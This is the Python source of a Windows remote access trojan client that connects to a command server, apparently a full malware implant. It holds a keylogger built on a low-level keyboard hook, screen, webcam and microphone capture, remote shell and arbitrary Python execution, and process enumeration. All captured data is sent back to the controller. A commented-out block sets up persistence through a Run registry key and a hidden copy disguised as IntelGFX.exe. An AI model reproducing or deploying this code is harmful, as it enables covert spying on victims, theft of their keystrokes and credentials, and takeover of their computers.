
# -*- coding: utf-8 -*-
# !/usr/bin/python

import socket
import time
import ast
import sys
import os
import platform
from ctypes.wintypes import MSG
from ctypes import wintypes, windll
import ctypes
import threading
import subprocess
import sched
import datetime
import zlib
import shutil

#HOST = '109.172.189.74'
HOST = '127.0.0.1'
PORT = 4434
ACTIVE = False

CSIDL_COMMON_APPDATA = 35

_SHGetFolderPath = windll.shell32.SHGetFolderPathW
_SHGetFolderPath.argtypes = [wintypes.HWND,
                            ctypes.c_int,
                            wintypes.HANDLE,
                            wintypes.DWORD, wintypes.LPCWSTR]


path_buf = wintypes.create_unicode_buffer(wintypes.MAX_PATH)
result = _SHGetFolderPath(0, CSIDL_COMMON_APPDATA, 0, 0, path_buf)

destination_folder = os.path.join(path_buf.value, 'Intel')
if not os.path.exists(destination_folder):
    os.makedirs(destination_folder)
destination_path = os.path.join(os.path.join(destination_folder, 'IntelGFX.exe'))
file_name = sys.argv[0]


# if not 'IntelGFX' in sys.argv[0]:
#     if not os.path.exists(destination_path):
#         shutil.copy2(sys.argv[0], destination_path)
#
#     if Shell32.IsUserAnAdmin() == 1:
#         reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format(
#             'Intel', destination_path)
#     else:
#         reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format(
#             'Intel', destination_path)
#     subprocess.Popen(reg_payload)
#
#     attrib_payload = r'attrib +h +s %s' % destination_path
#     subprocess.Popen(attrib_payload)
#     sys.exit(0)

while 1:
    try:
        GLOBAL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        GLOBAL_SOCKET.connect((HOST, PORT))
        GLOBAL_SOCKET.recv(1024)
        GLOBAL_SOCKET.sendall(str({'mode': 'buildClient', 'from': 'client', 'payload': '', 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
        received_data = ''
        payload = GLOBAL_SOCKET.recv(1024)
        while payload:
            received_data = received_data + payload
            if received_data.endswith('[ENDOFSOURCE]'):
                received_data = received_data[:-len('[ENDOFSOURCE]')]
                break
            else:
                payload = GLOBAL_SOCKET.recv(1024)
                continue
        try:
            ACTIVE = True

            # TODO: SOURCE START
            ID = ''
            COMMANDS = {}

            destination_directory = 'iDocuments'
            client_name = 'auto_update'
            client_version = '1.0'
            os_type = str(sys.platform)
            os_name = str(platform.platform())
            os_user = os.path.expanduser('~').split('\\')[-1]

            KEY_LOGS = {}
            SCREENSHOT_LOGS = {}
            AUDIO_LOGS = {}

            CURRENT_WINDOW_TITLE = None

            uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

            try:
                import vidcap
                cam = vidcap.new_Dev(0, 0)
                web_camera_input = str(cam.getdisplayname())
                del cam
            except:
                web_camera_input = 'NoDevice'

            try:
                import pyaudio
                p = pyaudio.PyAudio()
                device_name = p.get_default_input_device_info()
                del p
                audio_input = device_name['name']
            except:
                audio_input = 'NoDevice'

            # Init Winapi
            Kernel32 = ctypes.windll.kernel32
            User32 = ctypes.windll.user32
            Shell32 = ctypes.windll.shell32
            Gdi32 = ctypes.windll.gdi32
            Psapi = ctypes.windll.psapi

            # Init Screen Variables
            hDesktopWnd = User32.GetDesktopWindow()
            left = User32.GetSystemMetrics(76)
            top = User32.GetSystemMetrics(77)
            right = User32.GetSystemMetrics(78)
            bottom = User32.GetSystemMetrics(79)
            width = right - left
            height = bottom - top


            class REACTOR(threading.Thread):

                def __init__(self, data):
                    super(REACTOR, self).__init__()
                    global COMMANDS

                    self.data = data
                    self.active_thread = True

                def stop(self):
                    self.active_thread = False

                def run(self):

                    if self.data['mode'] == 'raiseException':
                        raise ValueError('Manualy Generated Exception')

                    # Terminate Client
                    elif self.data['mode'] == 'terminateClient':
                        os._exit(1)

                    elif self.data['mode'] == 'updateSource':
                        raise ValueError('Manually Generated Exception')

                    # Shell Mode
                    elif self.data['mode'] == 'explorerMode' and self.data['payload'].startswith('cd '):
                        try:
                            os.chdir(self.data['payload'][3:])
                            output = get_content()
                        except:
                            output = get_content()
                    # List Directory
                    elif self.data['mode'] == 'explorerMode' and self.data['payload'] == 'getContent':
                        output = get_content()

                    # Execute Script
                    elif self.data['mode'] == 'scriptingMode':
                        mprint = ''
                        try:
                            exec self.data['payload']
                            if mprint == '':
                                return '<font color="#e74c3c">No output</font><br>example: mprint = "STRING type"'
                            output = str(mprint)
                        except Exception as e:
                            output = str(e)

                    # Get Desktop Preview
                    elif self.data['mode'] == 'getScreen':
                        output = get_screenshot()

                    # Get Webcam Preview
                    elif self.data['mode'] == 'getWebcam':
                        output = webcam_shot()

                    # Set Log Settings
                    elif self.data['mode'] == 'setLogSettings':
                        set_info(self.data['payload'])

                    # Window Destroyed
                    elif self.data['mode'] == 'terminateProcess':
                        if COMMANDS.has_key(self.data['payload']):
                            COMMANDS[self.data['payload']].stop()
                            data_send('endCommandExecute', 'shellMode', session_id=self.data['session_id'], module_id=self.data['module_id'])
                        return

                    # Shell Mode
                    elif self.data['mode'] == 'shellMode' and self.data['payload'].startswith('cd '):
                        try:
                            os.chdir(self.data['payload'][3:])
                            output = ''
                        except:
                            output = 'dirOpenError'

                    elif self.data['mode'] == 'shellMode':
                        execproc = subprocess.Popen(self.data['payload'], shell=True,
                                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        while self.active_thread:
                            time.sleep(0.1)
                            line = execproc.stdout.readline()
                            if not line:
                                break
                            data_send(line, self.data['mode'], session_id=self.data['session_id'], module_id=self.data['module_id'])

                        output = 'endCommandExecute'
                    else:
                        return

                    try:
                        data_send(output, self.data['mode'], session_id=self.data['session_id'], module_id=self.data['module_id'])
                    except:
                        return


            class BITMAPINFOHEADER(ctypes.Structure):
                _fields_ = [
                    ('biSize', ctypes.c_uint32),
                    ('biWidth', ctypes.c_int),
                    ('biHeight', ctypes.c_int),
                    ('biPlanes', ctypes.c_short),
                    ('biBitCount', ctypes.c_short),
                    ('biCompression', ctypes.c_uint32),
                    ('biSizeimage', ctypes.c_uint32),
                    ('biXPelsPerMeter', ctypes.c_long),
                    ('biYPelsPerMeter', ctypes.c_long),
                    ('biClrUsed', ctypes.c_uint32),
                    ('biClrImportant', ctypes.c_uint32)]


            class BITMAPINFO(ctypes.Structure):
                _fields_ = [
                    ('bmiHeader', BITMAPINFOHEADER),
                    ('bmiColors', ctypes.c_ulong * 3)]

            bmp_info = BITMAPINFO()

            shiftcodes = {
                49: '!', 50: '@', 51: '#', 52: '$', 53: '%',
                54: '^', 55: '&', 56: '*', 57: '(', 48: ')',
                189: '_', 187: '+', 219: '{', 221: '}', 220: '|',
                186: ':', 222: '"', 188: '&lsaquo;', 190: '&rsaquo;', 191: '?',
            }
            keycodes = {
                160: '', 161: '', 32: '&nbsp;',
                9: '<font color=#288DA1>{tab}</font>', 8: '<font color=#D32B4E>{del}</font>', 162: '', 163: '', 144: '',
                35: '', 34: '', 33: '', 36: '', 45: '', 145: '', 19: '', 13: '<br>',
            }
            updatecode = {
                189: '-', 187: '=', 219: '[', 221: ']', 220: '\\',
                186: ';', 222: '\'', 188: ',', 190: '.', 191: '/',
                96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
                101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
                111: '/', 106: '*', 109: '-', 107: '+',
                110: '.'
            }

            # Init Processes Variables
            EnumProcesses = Psapi.EnumProcesses
            EnumProcesses.restype = ctypes.wintypes.BOOL
            GetProcessImageFileName = Psapi.GetProcessImageFileNameA
            GetProcessImageFileName.restype = ctypes.wintypes.DWORD
            OpenProcess = Kernel32.OpenProcess
            OpenProcess.restype = ctypes.wintypes.HANDLE
            TerminateProcess = Kernel32.TerminateProcess
            TerminateProcess.restype = ctypes.wintypes.BOOL
            CloseHandle = Kernel32.CloseHandle
            MAX_PATH = 260
            PROCESS_TERMINATE = 0x0001
            PROCESS_QUERY_INFORMATION = 0x0400


            def init():
                variables = {
                        'i': '',
                        'kts': False,
                        'kt': 30,
                        'ats': False,
                        'at': 30,
                        'atr': 1500,
                        'sts': False,
                        'std': 20,
                        'st': 30,
                    }
                if os.path.exists(os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo')):
                    variables = open(os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo'), 'r').read()
                    try:
                        return ast.literal_eval(variables)
                    except:
                        return variables
                else:
                    open(os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo'), 'w').write(str(variables))
                    os.popen('attrib -h -r -s /s /d %s' % os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo'))
                    return variables


            def get_content():
                string = {
                    'path': os.getcwdu(),
                    'logicalDrives': {},
                }
                uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
                bitmask = Kernel32.GetLogicalDrives()
                for letter in uppercase:
                    drive = u'{}:\\'.format(letter)
                    if bitmask & 1:
                        try:
                            os.chdir(drive)
                        except:
                            continue
                        volume_name_buffer = ctypes.create_unicode_buffer(1024)
                        Kernel32.GetVolumeInformationW(drive, volume_name_buffer,
                                                       ctypes.sizeof(volume_name_buffer), None, None, None, None,
                                                       None)
                        string['logicalDrives'][drive] = {
                            'name': volume_name_buffer.value,
                            'type': Kernel32.GetDriveTypeW(drive),
                        }
                    bitmask >>= 1
                try:
                    os.chdir(string['path'])
                    for n, i in enumerate(os.listdir(u'.')):
                        string[n] = {
                            'name': i,
                            'type': os.path.isfile(i),
                            'size': os.path.getsize(i),
                            'modified': time.ctime(os.path.getmtime(i)),
                            'hidden': has_hidden_attribute(i)
                        }
                    return str(string)
                except WindowsError:
                    return 'windowsError'


            def set_info(values):
                config = init()
                if values.has_key('kts'):
                    config['kts'] = values['kts']
                if values.has_key('kt'):
                    config['kt'] = values['kt']
                if values.has_key('ats'):
                    config['ats'] = values['ats']
                if values.has_key('at'):
                    config['at'] = values['at']
                if values.has_key('sts'):
                    config['sts'] = values['sts']
                if values.has_key('std'):
                    config['std'] = values['std']
                if values.has_key('st'):
                    config['st'] = values['st']
                open(os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo'), 'w').write(str(config))


            def get_date_time():
                now = datetime.datetime.now()
                year = now.year
                month = now.month
                if len(str(month)) < 2:
                    month = '0'+str(month)
                day = now.day
                if len(str(day)) < 2:
                    day = '0'+str(day)
                hour = now.hour
                minute = now.minute
                second = now.second
                return '%s-%s-%s_%s-%s-%s' % (year, month, day, hour, minute, second)


            def screen_bits():
                h_desktop_dc = User32.GetWindowDC(hDesktopWnd)
                h_capture_dc = Gdi32.CreateCompatibleDC(h_desktop_dc)
                h_capture_bitmap = Gdi32.CreateCompatibleBitmap(h_desktop_dc, width, height)
                Gdi32.SelectObject(h_capture_dc, h_capture_bitmap)
                Gdi32.BitBlt(h_capture_dc, 0, 0, width, height, h_desktop_dc, left, top, 0x00CC0020)
                hdc = User32.GetDC(None)
                bmp_info.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
                dib_rgb_colors = 0
                Gdi32.GetDIBits(hdc, h_capture_bitmap, 0, 0, None, ctypes.byref(bmp_info), dib_rgb_colors)
                bmp_info.bmiHeader.biSizeimage = int(
                        bmp_info.bmiHeader.biWidth * abs(bmp_info.bmiHeader.biHeight) * (bmp_info.bmiHeader.biBitCount + 7) / 8)
                p_buf = ctypes.create_unicode_buffer(bmp_info.bmiHeader.biSizeimage)
                Gdi32.GetBitmapBits(h_capture_bitmap, bmp_info.bmiHeader.biSizeimage, p_buf)
                return zlib.compress(p_buf)


            def send_keylog():
                global ACTIVE
                global CURRENT_WINDOW_TITLE
                global KEY_LOGS

                config = init()
                if config['kts'] and len(KEY_LOGS) > 0 and ACTIVE:
                    CURRENT_WINDOW_TITLE = ''
                    keys_for_send = str(KEY_LOGS)
                    KEY_LOGS = {}
                    data_send(keys_for_send, 'keyloggerLogs')
                key_scheduler = sched.scheduler(time.time, time.sleep)
                key_scheduler.enter(config['kt'], 1, send_keylog, ())
                key_scheduler.run()


            def send_screenshot():
                global ACTIVE
                global SCREENSHOT_LOGS

                config = init()
                if config['sts'] and len(SCREENSHOT_LOGS) > 0 and ACTIVE:
                    for i in SCREENSHOT_LOGS.keys():
                        try:
                            data_send(str(SCREENSHOT_LOGS[i]), 'screenshotLogs')
                        except KeyError:
                            pass
                    SCREENSHOT_LOGS = {}
                screen_scheduler = sched.scheduler(time.time, time.sleep)
                screen_scheduler.enter(config['st'], 1, send_screenshot, ())
                screen_scheduler.run()


            def send_audio():
                global AUDIO_LOGS
                config = init()
                if config['ats'] and len(AUDIO_LOGS) > 0:
                    for i in AUDIO_LOGS.keys():
                        data_send(str(AUDIO_LOGS[i]), 'audioLogs')
                    AUDIO_LOGS = {}
                audio_scheduler = sched.scheduler(time.time, time.sleep)
                audio_scheduler.enter(config['at'], 1, send_audio, ())
                audio_scheduler.run()


            def run_scheduler():
                key_thread = threading.Thread(target=send_keylog)
                key_thread.start()
                screen_thread = threading.Thread(target=send_screenshot)
                screen_thread.start()
                audio_thread = threading.Thread(target=send_audio)
                audio_thread.start()


            def get_fptr(fn):
                cmpfunc = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
                return cmpfunc(fn)


            class KeyLogger:
                def __init__(self):
                    self.hooked = None

                def install_hook_proc(self, pointer):
                    self.hooked = User32.SetWindowsHookExA(13, pointer, Kernel32.GetModuleHandleW(None), 0)
                    if not self.hooked:
                        return False
                    return True

                def uninstall_hook_proc(self):
                    if self.hooked is None:
                        return
                    ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
                    self.hooked = None


            class Key(threading.Thread):
                def __init__(self):
                    super(Key, self).__init__()

                    global KEY_LOGS

                @staticmethod
                def update_key(k):
                    if updatecode.has_key(k):
                        return updatecode[k]
                    else:
                        try:
                            return str(chr(k))
                        except:
                            return '{UnknownKeyCode: %s}' % k

                @staticmethod
                def write_key(log):
                    global CURRENT_WINDOW_TITLE

                    new_window_title = get_window_title()

                    if CURRENT_WINDOW_TITLE == new_window_title:
                        try:
                            KEY_LOGS['logs'] += log.encode('utf-8')
                        except UnicodeDecodeError:
                            KEY_LOGS['logs'] += '<font color="red">{UnicodeError}</font>'
                    else:
                        if KEY_LOGS.has_key('logs'):
                            KEY_LOGS['logs'] += '<br><p align="center" style="background-color: #34495e;color: #ecf0f1;"><font color="#e67e22">[%s] </font>' % get_date_time() + new_window_title + '</p><br>' + log.encode('utf-8')
                        else:
                            KEY_LOGS['logs'] = '<br><p align="center" style="background-color: #34495e;color: #ecf0f1;"><font color="#e67e22">[%s] </font>' % get_date_time() + new_window_title + '</p><br>' + log.encode('utf-8')
                        CURRENT_WINDOW_TITLE = new_window_title

                def hook_proc(self, n_code, w_param, l_param):
                    if w_param is not 0x0100:
                        return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)

                    if keycodes.has_key(l_param[0]):
                        key = keycodes[l_param[0]]
                    else:
                        if User32.GetKeyState(0x14) & 1:
                            if User32.GetKeyState(0x10) & 0x8000:
                                key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else self.update_key(l_param[0]).lower()
                            else:
                                key = self.update_key(l_param[0]).upper()
                        else:
                            if User32.GetKeyState(0x10) & 0x8000:
                                key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else self.update_key(l_param[0]).upper()
                            else:
                                key = self.update_key(l_param[0]).lower()

                    self.write_key(key)
                    return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)

                @staticmethod
                def start_keylogger():
                    msg = MSG()
                    User32.GetMessageA(ctypes.byref(msg), 0, 0, 0)

                def run(self):
                    self.keyLogger = KeyLogger()
                    self.pointer = get_fptr(self.hook_proc)
                    if self.keyLogger.install_hook_proc(self.pointer):
                        pass
                    self.start_keylogger()


            class AudioStreaming(threading.Thread):
                def __init__(self, rate):
                    super(AudioStreaming, self).__init__()

                    self.chunk = 1024
                    self.format = pyaudio.paInt16
                    self.channel = 1
                    self.rate = rate

                    self.frames = []

                    self.p = pyaudio.PyAudio()

                    self.stream = self.p.open(format=self.format, channels=self.channel, rate=self.rate, input=True,
                                              frames_per_buffer=self.chunk)

                def run(self):
                    global AUDIO_LOGS

                    config = init()

                    while 1:
                        if len(self.frames) > config['at']*4.6:
                            AUDIO_LOGS[get_date_time()] = {
                                'raw': zlib.compress(b''.join(self.frames)),
                                'format': self.format,
                                'channel': self.channel,
                                'rate': self.rate,
                            }
                            self.frames = []
                        self.frames.append(self.stream.read(self.chunk))

                    self.stream.close()
                    self.p.terminate()


            # Screen Shots
            class Screenshoter(threading.Thread):

                def run(self):

                    while 1:
                        config = init()
                        if config['sts']:
                            delay = config['std']
                            SCREENSHOT_LOGS[get_date_time()] = {
                                'screen_bits': screen_bits(),
                                'title_name': get_window_title(),
                                'width': width,
                                'height': height,
                                'date': get_date_time(),
                            }
                            time.sleep(delay)
                        time.sleep(config['std'])

            def check_info():
                config = init()
                return {
                    'os_type':          os_type,
                    'os':               os_name,
                    'user':             os_user,
                    'privileges':       str(Shell32.IsUserAnAdmin()),
                    'audio_device':     audio_input,
                    'webcamera_device': web_camera_input,
                    'window_title':     get_window_title(),
                    'key':              ID,
                    'kts':              config['kts'],
                    'kt':               config['kt'],
                    'ats':              config['ats'],
                    'at':               config['at'],
                    'sts':              config['sts'],
                    'std':              config['std'],
                    'st':               config['st'],
                }


            def get_key():
                vars_dict = init()
                return vars_dict['i']


            def set_key(key):
                global ID
                vars_dict = init()
                vars_dict['i'] = key
                input_file = open(os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo'), 'w')
                input_file.write(str(vars_dict))
                input_file.close()
                ID = key
                return


            def get_window_title():
                get_foreground_window = User32.GetForegroundWindow
                get_window_text_length = User32.GetWindowTextLengthW
                get_window_text = User32.GetWindowTextW
                hwnd = get_foreground_window()
                length = get_window_text_length(hwnd)
                buff = ctypes.create_unicode_buffer(length + 1)
                get_window_text(hwnd, buff, length + 1)
                return buff.value


            def get_screenshot():
                return str({
                    'width': width,
                    'height': height,
                    'screenshotbits': screen_bits()
                })


            def webcam_shot():
                cam = vidcap.new_Dev(0, 0)
                buff, width, height = cam.getbuffer()
                return str({
                    'webcambits': zlib.compress(buff),
                    'width': width,
                    'height': height,
                })


            def data_receive(end='[ENDOFMESSAGE]'):
                global GLOBAL_SOCKET
                received_data = ''
                try:
                    payload = GLOBAL_SOCKET.recv(1024)
                    while payload:
                        received_data = received_data + payload
                        if received_data.endswith(end):
                            received_data = received_data[:-len(end)]
                            break
                        else:
                            payload = GLOBAL_SOCKET.recv(1024)
                            continue
                    return ast.literal_eval(received_data)
                except socket.error:
                    return {'payload': '', 'mode': '', 'from': '', 'to': ''}


            # Send Data Function
            def data_send(msg, mode, session_id='', module_id='', end='[ENDOFMESSAGE]'):
                global GLOBAL_SOCKET
                global ACTIVE
                global ID
                message = {
                    'payload': msg,
                    'mode': mode,
                    'from': 'client',
                    'session_id': session_id,
                    'module_id': module_id,
                    'key': ID,
                }
                try:
                    GLOBAL_SOCKET.sendall(str(message)+end)
                    ACTIVE = True
                except (socket.error, NameError):
                    return


            ###
            # FUNCTIONS
            ###
            # Run Shell Command
            def run_shell(cmde):
                if cmde:
                    try:
                        execproc = subprocess.Popen(cmde, shell=True,
                                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        #cmdoutput = execproc.stdout.read() + execproc.stderr.read()
                        for line in iter(execproc.stdout.readline, ''):
                            data_send(line, 'shellMode')
                            time.sleep(0.5)
                    except Exception as e:
                        return str(e)

                else:
                    return "Enter a command.\n"

            # Check Hidden Attribute
            def has_hidden_attribute(filepath):
                try:
                    attrs = Kernel32.GetFileAttributesW(unicode(filepath))
                    assert attrs != -1
                    result = bool(attrs & 2)
                except (AttributeError, AssertionError):
                    result = False
                return result

            # Set Hidden Attribute
            def set_content_attribute(filepath):
                if has_hidden_attribute:
                    Kernel32.SetFileAttributesW(filepath, 1)
                else:
                    Kernel32.SetFileAttributesW(filepath, 2)

            # Get Processes
            def get_processes_list():
                PROCESSES = {}
                max_array = ctypes.c_ulong * 4096
                pProcessIds = max_array()
                pBytesReturned = ctypes.c_ulong()
                Psapi.EnumProcesses(ctypes.byref(pProcessIds), ctypes.sizeof(pProcessIds), ctypes.byref(pBytesReturned))
                nReturned = pBytesReturned.value/ctypes.sizeof(ctypes.c_ulong())
                pidProcessArray = [i for i in pProcessIds][:nReturned]
                for ProcessId in pidProcessArray:
                    hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, False, ProcessId)
                    if hProcess:
                        ImageFileName = (ctypes.c_char*MAX_PATH)()
                        if GetProcessImageFileName(hProcess, ImageFileName, MAX_PATH)>0:
                            filename = os.path.basename(ImageFileName.value)
                            PROCESSES[ProcessId] = filename
                        CloseHandle(hProcess)
                return str(PROCESSES)

            def send_info():
                global ACTIVE
                while ACTIVE:
                    try:
                        info_data = check_info()
                        data_send(info_data, 'infoChecker')
                        time.sleep(5)
                    except socket.error:
                        ACTIVE = False


            def reactor():
                global ACTIVE
                global ID
                global COMMANDS

                while 1:

                    key = get_key()
                    if len(key) != 0:
                        ID = key
                        data_send(key, 'clientInitializing')
                    else:
                        data_send('noKey', 'clientInitializing')
                        new_key = data_receive()
                        set_key(new_key['payload'])
                        ID = new_key['payload']

                    info_sernder_thread = threading.Thread(target=send_info)
                    info_sernder_thread.start()

                    # After Initialized
                    while ACTIVE:
                        data = data_receive()
                        if data:
                            COMMANDS[data['module_id']] = REACTOR(data)
                            COMMANDS[data['module_id']].start()
                        else:
                            continue

            if not 'IntelGFX' in sys.argv[0]:
                # Change Home Dir
                os.chdir(os.path.dirname(sys.argv[0]))
                # Run Loggers
                run_scheduler()
                keylogger = Key()
                keylogger.start()
                screenshoter = Screenshoter()
                screenshoter.start()
                if not audio_input == 'NoDevice':
                    audioLogger = AudioStreaming(5120)
                    audioLogger.start()
                # Main Reactor
                reactor()

            # TODO: SOURCE END

        except Exception as e:
            ACTIVE = False
            GLOBAL_SOCKET.sendall(str({'mode': 'buildClientError', 'from': 'client', 'payload': '%s' % e, 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
            GLOBAL_SOCKET.close()
            del GLOBAL_SOCKET
            time.sleep(6)
    except socket.error as e:
        time.sleep(5)